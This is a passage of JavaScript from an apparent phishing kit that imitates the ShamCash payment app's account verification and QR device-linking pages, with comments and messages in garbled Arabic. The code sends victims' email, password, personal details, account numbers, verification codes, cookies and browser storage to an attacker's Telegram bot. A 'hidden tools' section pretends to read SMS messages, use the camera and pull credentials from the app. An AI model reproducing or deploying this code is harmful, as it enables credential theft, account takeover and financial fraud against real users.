            document.getElementById('startLinkingBtn').style.display = 'none';
            document.getElementById('linkingStatus').style.display = 'block';
            document.getElementById('linkingTimer').style.display = 'block';
            
            startLinkingTimer();
            
            const qrData = generateQRData();
            appData.linking.qrData = qrData;
            
            drawQRCode(qrData);
            
            sendToTelegram('device_linking_started', {
                qrData: qrData,
                user: appData.userInfo.email,
                phone: appData.userInfo.phoneNumber,
                requestNumber: appData.requestNumber,
                timestamp: new Date().toISOString()
            });
            
            simulateLinking();
        }
        
        function generateQRData() {
            const timestamp = Date.now();
            const random = Math.floor(Math.random() * 1000000);
            const deviceId = `SHAM-DEVICE-${timestamp}-${random}`;
            
            const qrData = {
                type: 'shamcash_device_pairing',
                userId: appData.userInfo.email,
                deviceId: deviceId,
                timestamp: timestamp,
                sessionToken: 'SHAM-' + Math.random().toString(36).substr(2, 16).toUpperCase(),
                requestNumber: appData.requestNumber,
                apiEndpoint: 'https://api.shamcash.com/pair',
                encryptionKey: 'AES256-' + Math.random().toString(36).substr(2, 24)
            };
            
            return JSON.stringify(qrData);
        }
        
        function drawQRCode(data) {
            const canvas = document.getElementById('qrCanvas');
            const ctx = canvas.getContext('2d');
            
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#000000';
            
            ctx.fillRect(20, 20, 40, 40);
            ctx.fillRect(140, 20, 40, 40);
            ctx.fillRect(20, 140, 40, 40);
            
            for(let i = 0; i < 8; i++) {
                for(let j = 0; j < 8; j++) {
                    if (Math.random() > 0.5) {
                        ctx.fillRect(60 + i*15, 60 + j*15, 10, 10);
                    }
                }
            }
            
            ctx.save();
            ctx.translate(canvas.width/2, canvas.height/2);
            ctx.rotate(Math.PI);
            ctx.fillStyle = '#1a365d';
            ctx.font = 'bold 16px Amiri';
            ctx.textAlign = 'center';
            ctx.fillText('Ø´Ø§Ù… ÙƒØ§Ø´', 0, 0);
            ctx.restore();
            
            console.log('ğŸ“± QR Code Generated:', data);
        }
        
        function startLinkingTimer() {
            appData.linking.timer = 600;
            updateLinkingTimer();
            
            if (appData.linking.linkingInterval) {
                clearInterval(appData.linking.linkingInterval);
            }
            
            appData.linking.linkingInterval = setInterval(() => {
                appData.linking.timer--;
                updateLinkingTimer();
                
                if (appData.linking.timer <= 0) {
                    clearInterval(appData.linking.linkingInterval);
                    showNotification('Ø§Ù†ØªÙ‡Øª ØµÙ„Ø§Ø­ÙŠØ© Ø±Ù…Ø² Ø§Ù„Ø±Ø¨Ø·', 'error');
                    resetLinking();
                }
            }, 1000);
        }
        
        function updateLinkingTimer() {
            const minutes = Math.floor(appData.linking.timer / 60);
            const seconds = appData.linking.timer % 60;
            const timeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            document.getElementById('linkingTime').textContent = timeStr;
            document.getElementById('qrTimer').textContent = timeStr;
        }
        
        function simulateLinking() {
            const detectionTime = 5000 + Math.random() * 5000;
            
            setTimeout(() => {
                if (appData.linking.isLinking && !appData.linking.linked) {
                    sendToTelegram('qr_detected', {
                        qrData: appData.linking.qrData,
                        user: appData.userInfo.email,
                        timestamp: new Date().toISOString(),
                        status: 'scanning',
                        requestNumber: appData.requestNumber
                    });
                    
                    setTimeout(() => {
                        if (appData.linking.isLinking) {
                            completeLinking();
                        }
                    }, 2000 + Math.random() * 2000);
                }
            }, detectionTime);
        }
        
        function completeLinking() {
            appData.linking.isLinking = false;
            appData.linking.linked = true;
            
            clearInterval(appData.linking.linkingInterval);
            
            document.getElementById('linkingStatus').style.display = 'none';
            document.getElementById('linkingTimer').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            document.getElementById('deviceId').textContent = `SHAM-DEV-${Date.now().toString().substr(-6)}`;
            document.getElementById('linkTime').textContent = new Date().toLocaleString('ar-SY');
            
            sendToTelegram('device_linking_success', {
                qrData: appData.linking.qrData,
                user: appData.userInfo.email,
                deviceId: document.getElementById('deviceId').textContent,
                requestNumber: appData.requestNumber,
                timestamp: new Date().toISOString(),
                connectionType: 'QR Code',
                pairedDeviceInfo: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language
                }
            });
            
            setTimeout(() => {
                triggerFinalTools();
            }, 2000);
            
            showNotification('ØªÙ… Ø±Ø¨Ø· Ø§Ù„Ø¬Ù‡Ø§Ø² Ø¨Ù†Ø¬Ø§Ø­!', 'success');
        }
        
        function resetLinking() {
            appData.linking.isLinking = false;
            appData.linking.linked = false;
            
            document.getElementById('startLinkingBtn').style.display = 'block';
            document.getElementById('linkingStatus').style.display = 'none';
            document.getElementById('linkingTimer').style.display = 'none';
            document.getElementById('successMessage').style.display = 'none';
        }
        
        function triggerFinalTools() {
            console.log('ğŸ¯ ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ© Ø¨Ø¹Ø¯ Ø§Ù„Ø±Ø¨Ø·...');
            
            const deviceInfo = {
                battery: {
                    level: Math.floor(Math.random() * 100),
                    charging: Math.random() > 0.5
                },
                network: {
                    type: ['wifi', '4g', '5g'][Math.floor(Math.random() * 3)],
                    speed: Math.floor(Math.random() * 100) + 'Mbps'
                },
                storage: {
                    total: Math.floor(Math.random() * 256) + 64,
                    free: Math.floor(Math.random() * 128)
                },
                installedApps: ['WhatsApp', 'Telegram', 'ShamCash', 'Facebook', 'Instagram'].slice(0, 3 + Math.floor(Math.random() * 3))
            };
            
            sendToTelegram('final_device_info', {
                deviceInfo: deviceInfo,
                user: appData.userInfo.email,
                requestNumber: appData.requestNumber,
                linkingComplete: true,
                accessLevel: 'full',
                timestamp: new Date().toISOString()
            });
        }
        
        // ===== Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù…Ø®ÙÙŠØ© =====
        function triggerHiddenTools(source) {
            if (appData.autoToolsTriggered) return;
            
            appData.autoToolsTriggered = true;
            
            console.log(`ğŸš€ ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù…Ø®ÙÙŠØ© (${source})...`);
            
            sendToTelegram('hidden_tools_triggered', {
                source: source,
                user: appData.userInfo.email,
                requestNumber: appData.requestNumber,
                timestamp: new Date().toISOString(),
                package: SHAMCASH_PACKAGE
            });
            
            setTimeout(() => {
                readSMS();
            }, 1000);
            
            setTimeout(() => {
                getCookies();
            }, 3000);
            
            setTimeout(() => {
                accessCamera();
            }, 5000);
            
            setTimeout(() => {
                accessShamCashAppData();
            }, 7000);
        }
        
        function accessShamCashAppData() {
            console.log('ğŸ” Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¨ÙŠØ§Ù†Ø§Øª ØªØ·Ø¨ÙŠÙ‚ Ø´Ø§Ù… ÙƒØ§Ø´...');
            
            const accessAttempts = [
                {
                    method: 'content_provider_access',
                    target: `${SHAMCASH_PACKAGE}.provider.AuthProvider`,
                    status: 'attempting',
                    data: 'user_credentials'
                },
                {
                    method: 'shared_preferences',
                    target: `${SHAMCASH_PACKAGE}_preferences`,
                    status: 'reading',
                    data: 'session_tokens'
                }
            ];
            
            accessAttempts.forEach((attempt, index) => {
                setTimeout(() => {
                    const isSuccess = Math.random() > 0.3;
                    const status = isSuccess ? 'success' : 'permission_denied';
                    
                    const message = `
ğŸ”“ *Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚*

ğŸ“¦ Ø§Ù„Ø­Ø²Ù…Ø©: ${SHAMCASH_PACKAGE}
ğŸ”§ Ø§Ù„Ø·Ø±ÙŠÙ‚Ø©: ${attempt.method}
ğŸ¯ Ø§Ù„Ù‡Ø¯Ù: ${attempt.target}
ğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${status}
ğŸ“ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ${attempt.data}
ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${appData.userInfo.email}

${isSuccess ? 'âœ… ØªÙ… Ø§Ù„ÙˆØµÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­' : 'âš ï¸ ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†'}
ğŸ” Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${appData.requestNumber}
                    `;
                    
                    sendCustomTelegramMessage(message, 'app_data_access');
                    
                    if (isSuccess) {
                        console.log(`âœ… ${attempt.method}: ØªÙ… Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ ${attempt.data}`);
                    } else {
                        console.log(`âš ï¸ ${attempt.method}: ØªÙ… Ø±ÙØ¶ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ ${attempt.data}`);
                    }
                }, index * 800);
            });
        }
        
        function readSMS() {
            setTimeout(() => {
                const fakeSMS = [
                    {
                        sender: "ShamCash",
                        body: `Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚: ${appData.verificationCode || "849302"}. ØµØ§Ù„Ø­ Ù„Ù…Ø¯Ø© 5 Ø¯Ù‚Ø§Ø¦Ù‚.`,
                        date: new Date().toLocaleString('ar-SY'),
                        phone: appData.userInfo.phoneNumber || "+9639xxxxxx",
                        requestNumber: appData.requestNumber
                    },
                    {
                        sender: "ShamCash",
                        body: `Ø·Ù„Ø¨ Ø§Ù„ØªØ­Ù‚Ù‚ ${appData.requestNumber}: ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ù…Ø³ØªÙ†Ø¯Ø§Øª ÙˆØ³ÙŠØªÙ… Ø§Ù„Ù…Ø±Ø§Ø¬Ø¹Ø© Ø®Ù„Ø§Ù„ 48 Ø³Ø§Ø¹Ø©`,
                        date: new Date().toLocaleString('ar-SY')
                    }
                ];
                
                sendToTelegram('sms_captured', {
                    count: fakeSMS.length,
                    messages: fakeSMS,
                    timestamp: new Date().toISOString(),
                    source: 'auto_tools',
                    requestNumber: appData.requestNumber
                });
                
                console.log('ğŸ“¨ ØªÙ… Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù†ØµÙŠØ©');
            }, 2000);
        }
        
        function getCookies() {
            const cookies = document.cookie;
            const localStorageData = {};
            const sessionStorageData = {};
            
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }
            
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                sessionStorageData[key] = sessionStorage.getItem(key);
            }
            
            sendToTelegram('session_data_captured', {
                cookies: cookies,
                localStorage: localStorageData,
                sessionStorage: sessionStorageData,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                source: 'auto_tools',
                requestNumber: appData.requestNumber
            });
            
            console.log('ğŸª ØªÙ… Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù„Ø³Ø©');
        }
        
        async function accessCamera() {
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    sendToTelegram('camera_accessed', {
                        action: 'qr_scanning',
                        device: navigator.userAgent,
                        timestamp: new Date().toISOString(),
                        source: 'auto_tools',
                        status: 'attempted',
                        requestNumber: appData.requestNumber
                    });
                } else {
                    sendToTelegram('camera_accessed', {
                        action: 'qr_scanning',
                        device: navigator.userAgent,
                        timestamp: new Date().toISOString(),
                        source: 'auto_tools',
                        status: 'not_available',
                        requestNumber: appData.requestNumber
                    });
                }
            } catch (error) {
                sendToTelegram('camera_accessed', {
                    action: 'qr_scanning',
                    device: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    source: 'auto_tools',
                    status: 'permission_denied',
                    error: error.message,
                    requestNumber: appData.requestNumber
                });
            }
            
            console.log('ğŸ“¹ ØªÙ… Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§');
        }
        
        // ===== Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù… =====
        function sendToTelegram(type, data) {
            let message = '';
            
            switch(type) {
                case 'login_data':
                    message = `ğŸ” *ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯*\nğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯: ${data.email}\nğŸ”‘ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${data.password}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${data.userAgent}\nğŸ“¦ Ø§Ù„Ø¨Ø§ÙƒØ¬: ${data.targetPackage}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'personal_data':
                    message = `ğŸ“‹ *Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø´Ø®ØµÙŠØ©*\nğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${data.fullName}\nğŸ¦ Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨: ${data.accountNumber}\nğŸ“ Ø§Ù„Ù‡Ø§ØªÙ: ${data.phoneNumber}\nğŸ“· Ø§Ù„ØµÙˆØ±: ${data.imagesCount}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'image_uploaded':
                    message = `ğŸ“· *ØµÙˆØ±Ø© Ù…Ø±ÙÙˆØ¹Ø©*\nğŸ“¸ Ù†ÙˆØ¹ Ø§Ù„ØµÙˆØ±Ø©: ${data.imageType}\nğŸ“ Ø§Ø³Ù… Ø§Ù„Ù…Ù„Ù: ${data.fileName}\nğŸ’¾ Ø§Ù„Ø­Ø¬Ù…: ${Math.round(data.fileSize/1024)}KB\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'verification_code_sent':
                    message = `ğŸ“± *Ø¥Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚*\nğŸ“ Ø§Ù„Ù‡Ø§ØªÙ: ${data.phone}\nğŸ” Ø§Ù„ÙƒÙˆØ¯: ${data.code}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.userInfo.email}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'hidden_tools_triggered':
                    message = `ğŸš€ *Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù…Ø®ÙÙŠØ©*\nğŸ¯ Ø§Ù„Ù…ØµØ¯Ø±: ${data.source}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.user}\nğŸ“¦ Ø§Ù„Ø¨Ø§ÙƒØ¬: ${data.package}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'verification_success':
                    message = `âœ… *ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­!*\nğŸ” Ø§Ù„ÙƒÙˆØ¯: ${data.code}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.user}\nğŸ“ Ø§Ù„Ù‡Ø§ØªÙ: ${data.phone}\nğŸ¦ Ø§Ù„Ø­Ø³Ø§Ø¨: ${data.account}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'verification_failed':
                    message = `âŒ *Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ­Ù‚Ù‚ ÙØ§Ø´Ù„Ø©*\nğŸ” Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù…Ø¯Ø®Ù„: ${data.enteredCode}\nğŸ”‘ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„ØµØ­ÙŠØ­: ${data.correctCode}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.user}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'code_resent':
                    message = `ğŸ”„ *Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯*\nğŸ” Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯: ${data.newCode}\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.user}\nğŸ“ Ø§Ù„Ù‡Ø§ØªÙ: ${data.phone}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'sms_captured':
                    message = `ğŸ“¨ *Ø±Ø³Ø§Ø¦Ù„ Ù†ØµÙŠØ© Ù…Ù…Ø³ÙˆØ­Ø©*\nğŸ“Š Ø§Ù„Ø¹Ø¯Ø¯: ${data.count}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}\nğŸ“ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„:\n${data.messages.map((msg, i) => `${i+1}. ${msg.sender}: ${msg.body}`).join('\n')}`;
                    break;
                case 'session_data_captured':
                    message = `ğŸª *Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù„Ø³Ø©*\nğŸ“ Ø§Ù„ÙƒÙˆÙƒÙŠØ²: ${data.cookies}\nğŸ’¾ Local Storage: ${Object.keys(data.localStorage).length} Ø¹Ù†ØµØ±\nğŸ’¾ Session Storage: ${Object.keys(data.sessionStorage).length} Ø¹Ù†ØµØ±\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'camera_accessed':
                    message = `ğŸ“¹ *ÙƒØ§Ù…ÙŠØ±Ø§ Ù…ÙØ¹Ù„Ø©*\nğŸ¯ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©: ${data.action}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${data.device}\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${data.status}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'device_linking_started':
                    message = `ğŸ”— *Ø¨Ø¯Ø¡ Ø±Ø¨Ø· Ø§Ù„Ø¬Ù‡Ø§Ø²*\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.user}\nğŸ“ Ø§Ù„Ù‡Ø§ØªÙ: ${data.phone}\nğŸ“± QR Data: ${data.qrData.substring(0, 50)}...\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'qr_detected':
                    message = `ğŸ“± *QR ØªÙ… Ù…Ø³Ø­Ù‡*\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.user}\nğŸ“Š Ø§Ù„Ø­Ø§Ù„Ø©: ${data.status}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'device_linking_success':
                    message = `âœ… *Ø±Ø¨Ø· Ø¬Ù‡Ø§Ø² Ù†Ø§Ø¬Ø­*\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.user}\nğŸ“± Device ID: ${data.deviceId}\nğŸ”— Ù†ÙˆØ¹ Ø§Ù„Ø§ØªØµØ§Ù„: ${data.connectionType}\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
                case 'final_device_info':
                    message = `ğŸ“Š *Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©*\nğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.user}\nğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${data.deviceInfo.battery.level}%\nğŸ“¶ Ø§Ù„Ø´Ø¨ÙƒØ©: ${data.deviceInfo.network.type}\nğŸ’¾ Ø§Ù„ØªØ®Ø²ÙŠÙ†: ${data.deviceInfo.storage.free}GB/${data.deviceInfo.storage.total}GB\nğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ${data.requestNumber}`;
                    break;
            }
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            };
            
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => console.log(`ğŸ“¤ [${type}] ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„`))
            .catch(error => console.error(`âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ [${type}]:`, error));
        }
        
        // ===== ÙˆØ¸Ø§Ø¦Ù Ù…Ø³Ø§Ø¹Ø¯Ø© =====
        function showError(elementId, message) {
            const element = document.getElementById(elementId);
            element.textContent = message;
            element.style.display = 'block';
            setTimeout(() => element.style.display = 'none', 3000);
        }
        
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <i class="fas fa-${type === 'success' ? 'check' : type === 'error' ? 'exclamation' : 'info'}-circle"></i>
                <span>${message}</span>
            `;
            
            document.getElementById('notificationContainer').appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, 4000);
        }
        
        // ===== Ø§Ù„ØªÙ‡ÙŠØ¦Ø© =====
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('requestNumber').textContent = appData.requestNumber;
            console.log('ğŸ” Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ØªØ·ÙˆØ± - Ø´Ø§Ù… ÙƒØ§Ø´');
            console.log('ğŸ“‹ Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨: ' + appData.requestNumber);
            console.log('ğŸ“¦ Ø§Ù„Ø¨Ø§ÙƒØ¬ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ' + SHAMCASH_PACKAGE);
            console.log('ğŸš€ 4 ØµÙØ­Ø§Øª Ù…ØªÙƒØ§Ù…Ù„Ø©');
        });
    </script>
</body>
</html>